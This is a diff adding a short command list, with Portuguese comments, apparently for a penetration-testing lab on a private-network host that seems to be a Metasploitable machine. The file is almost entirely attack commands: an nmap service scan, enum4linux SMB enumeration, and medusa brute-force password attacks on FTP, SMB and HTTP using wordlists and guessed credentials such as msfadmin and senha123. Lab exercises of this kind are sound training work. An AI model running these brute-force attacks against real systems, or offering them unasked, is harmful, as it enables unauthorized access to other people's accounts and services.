@@ -1,0 +1,14 @@
+# Escaneamento Nmap
+nmap -sV 192.168.56.102
+
+# Ataque FTP
+medusa -h 192.168.56.102 -u msfadmin -P wordlists/senhas.txt -M ftp
+
+# Enumeração SMB
+enum4linux 192.168.56.102
+
+# Ataque SMB
+medusa -h 192.168.56.102 -U wordlists/usuarios.txt -p senha123 -M smbnt
+
+# Ataque HTTP
+medusa -h 192.168.56.102 -u admin -P wordlists/senhas.txt -M http
